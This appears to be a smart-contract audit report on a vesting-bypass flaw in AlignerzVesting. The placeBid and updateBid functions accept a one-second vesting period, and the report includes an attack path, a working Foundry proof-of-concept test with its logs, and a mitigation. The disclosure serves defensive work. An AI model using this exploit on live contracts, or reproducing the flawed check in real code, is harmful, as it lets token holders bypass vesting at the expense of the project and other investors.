# [000736] Vesting Period Bypass Allows Instant Token Claims via 1-Second Vesting
  
  ### Summary

The flawed validation logic in `AlignerzVesting::placeBid` and `AlignerzVesting::updateBid` will cause users to bypass vesting schedules entirely as any user can set `vestingPeriod = 1` to claim tokens immediately after bidding closes, defeating the protocol's tokenomics design.

### Root Cause

In `AlignerzVesting::placeBid` the check `require(vestingPeriod < 2 || vestingPeriod % vestingPeriodDivisor == 0, ...)` allows vestingPeriod = 1 to bypass the divisor validation entirely
```solidity
 function placeBid(uint256 projectId, uint256 amount, uint256 vestingPeriod) external {
        if (isWhitelistEnabled[projectId]) {
            require(isWhitelisted[msg.sender][projectId], User_Is_Not_whitelisted());
        }
        require(projectId < biddingProjectCount, Invalid_Project_Id());
        require(amount > 0, Zero_Value());

        BiddingProject storage biddingProject = biddingProjects[projectId];
        require(
            block.timestamp >= biddingProject.startTime && block.timestamp <= biddingProject.endTime && !biddingProject.closed,
            Bidding_Period_Is_Not_Active()
        );
        require(biddingProject.bids[msg.sender].amount == 0, Bid_Already_Exists());

        require(vestingPeriod > 0, Zero_Value());

        require (vestingPeriod < 2 || vestingPeriod % vestingPeriodDivisor == 0, Vesting_Period_Is_Not_Multiple_Of_The_Base_Value()); //@> User can set vesting period as 1 and claim immediately
```
Similarly in `AlignerzVesting::updateBid`, the condition `if (newVestingPeriod > 1)` skips divisor validation when `newVestingPeriod == 1`
```solidity
 function updateBid(uint256 projectId, uint256 newAmount, uint256 newVestingPeriod) external {
        require(projectId < biddingProjectCount, Invalid_Project_Id());
        BiddingProject storage biddingProject = biddingProjects[projectId];
        require(
            block.timestamp >= biddingProject.startTime && block.timestamp <= biddingProject.endTime && !biddingProject.closed,
            Bidding_Period_Is_Not_Active()
        );

        Bid storage bid = biddingProject.bids[msg.sender];
        uint256 oldAmount = bid.amount;
        require(oldAmount > 0, No_Bid_Found());
        require(newAmount >= oldAmount, New_Bid_Cannot_Be_Smaller());
        require(newVestingPeriod > 0, Zero_Value());
        require(newVestingPeriod >= bid.vestingPeriod, New_Vesting_Period_Cannot_Be_Smaller());
        if (newVestingPeriod > 1) { //@> Same vesting period bypass, twice now --> PoC later
            require(
                newVestingPeriod % vestingPeriodDivisor == 0, Vesting_Period_Is_Not_Multiple_Of_The_Base_Value()
            );
        }
```
The protocol intends to enforce vesting periods as multiples of `vestingPeriodDivisor` (default: 2,592,000 seconds = 30 days), but the special case for values < 2 creates a loophole.

### Internal Pre-conditions

1. Owner needs to call `AlignerzVesting::launchBiddingProject` to create a bidding project with any token and stablecoin addresses.
2. Bidding period must be active (between startTime and endTime)

### External Pre-conditions

None

### Attack Path

1. User calls `AlignerzVesting::placeBid(projectId, amount, 1)` during the active bidding period, setting `vestingPeriod = 1` i.e 1 second
2. The validation check passes because `vestingPeriod < 2` evaluates to true, bypassing the modulo requirement. 
3. Bid is stored with `vestingPeriod = 1` in the contract state
4. Owner finalizes bids via `AlignerzVesting::finalizeBids`, allocating tokens to the user based on their bid. 
5. User claims NFT via `AlignerzVesting::claimNFT` to receive their vesting certificate.
6. User immediately claims all tokens by calling `AlignerzVesting::claimTokens` just 1 second after `biddingProject.endTime`, receiving their full allocation instantly instead of waiting months/years.

### Impact

Users bypass the protocol's vesting mechanism entirely, claiming 100% of their token allocation immediately after bidding closes. This defeats the purpose of vesting schedules, which are designed to align long-term incentives and prevent immediate token dumps.

### PoC

The following test was ran and produced these logs: 
```bash
Ran 1 test for test/PoC.t.sol:VestingBypassPoC
[PASS] testBypassVestingAndClaimImmediately() (gas: 1067133)
Logs:
  npm warn exec The following package was not found and will be installed: @openzeppelin/upgrades-core@1.44.2

  User successfully claimed NFT ID: 1
  Tokens claimed immediately: 100000000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 101.35s (2.76ms CPU time)

Ran 1 test suite in 101.37s (101.35s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity =0.8.29;

import "forge-std/Test.sol";
import {AlignerzVesting} from "../src/contracts/vesting/AlignerzVesting.sol";
import {AlignerzNFT} from "../src/contracts/nft/AlignerzNFT.sol";
import {Aligners26} from "../src/contracts/token/Aligners26.sol";
import {MockUSD} from "../src/MockUSD.sol";
import {Upgrades} from "openzeppelin-foundry-upgrades/Upgrades.sol";
import "forge-std/console.sol";

contract VestingBypassPoC is Test {
    AlignerzVesting public vesting;
    AlignerzNFT public nft;
    Aligners26 public token;
    MockUSD public usdt;
    
    address public user;
    uint256 constant PROJECT_ID = 0;

    // Define events for tracking
    event BidPlaced(uint256 indexed projectId, address indexed user, uint256 amount, uint256 vestingPeriod);

    function setUp() public {
        user = makeAddr("user");
        token = new Aligners26("26Aligners", "A26Z");
        usdt = new MockUSD();
        nft = new AlignerzNFT("AlignerzNFT", "AZNFT", "https://nft.alignerz.bid/");
        
        address payable proxy = payable(Upgrades.deployUUPSProxy(
            "AlignerzVesting.sol",
            abi.encodeCall(AlignerzVesting.initialize, (address(nft)))
        ));
        vesting = AlignerzVesting(proxy);
        
        nft.addMinter(address(vesting));
        vesting.setTreasury(address(1)); // Set treasury for fees
        
        // Setup User funds
        usdt.mint(user, 10000 ether);
        vm.prank(user);
        usdt.approve(address(vesting), type(uint256).max);

        // Fund Vesting contract with Project Tokens (for the payout)
        
        token.approve(address(vesting), type(uint256).max);
    }
    
    function testBypassVestingAndClaimImmediately() public {
        // 1. Launch Project
        uint256 startTime = block.timestamp + 1 days;
        uint256 endTime = startTime + 7 days;
        
        vesting.launchBiddingProject(
            address(token),
            address(usdt),
            startTime,
            endTime,
            bytes32(0),
            false
        );

        // Create a pool (Pool ID 0) so we can allocate the user to it later
        vesting.createPool(PROJECT_ID, 5000 ether, 1 ether, false);

        // Warp to active bidding time
        vm.warp(startTime + 1);

        // 2. User places bid with 1 second vesting
        // This bypasses the "Multiple of X" check
        vm.startPrank(user);
        uint256 amount = 100 ether;
        uint256 bypassPeriod = 1; // 1 second vesting!
        vesting.placeBid(PROJECT_ID, amount, bypassPeriod);
        vm.stopPrank();

        // Warp to bidding end
        vm.warp(endTime + 1);

        // 3. Owner Finalizes Bids
       
        // Since there is only 1 user, the Root is equal to the Leaf hash.
        
        // Leaf = keccak256(abi.encodePacked(user, amount, projectId, poolId))
        bytes32 leaf = keccak256(abi.encodePacked(user, amount, PROJECT_ID, uint256(0)));
        
        bytes32[] memory roots = new bytes32[](1);
        roots[0] = leaf; // Root is just the leaf for 1-item tree
        
        vesting.finalizeBids(PROJECT_ID, bytes32(0), roots, 30 days);

        // 4. User claims their NFT (TVS)
        vm.startPrank(user);
        
        // Empty proof works when Root == Leaf
        bytes32[] memory proof = new bytes32[](0); 
        uint256 nftId = vesting.claimNFT(PROJECT_ID, 0, amount, proof);
        
        console.log("User successfully claimed NFT ID:", nftId);

        // 5. The Exploit: Claim ALL tokens immediately
        // Vesting Start Time = Time of Finalization (Now)
        // Vesting Duration = 1 second
        
        // We warp just 1 second into the future
        vm.warp(block.timestamp + 1);
        
        uint256 balanceBefore = token.balanceOf(user);
        
        // This should claim 100% of the tokens. 
        // Normal users would have to wait months/years.
        vesting.claimTokens(PROJECT_ID, nftId);
        
        uint256 balanceAfter = token.balanceOf(user);
        uint256 claimed = balanceAfter - balanceBefore;
        
        console.log("Tokens claimed immediately:", claimed);
        
        assertEq(claimed, amount, "Failed to bypass vesting: Should claim 100% immediately");
        
        vm.stopPrank();
    }
}
```

### Mitigation

Remove the special case for `vestingPeriod < 2` in both `placeBid()` and `updateBid()` functions. Enforce that all vesting periods must be multiples of `vestingPeriodDivisor`
  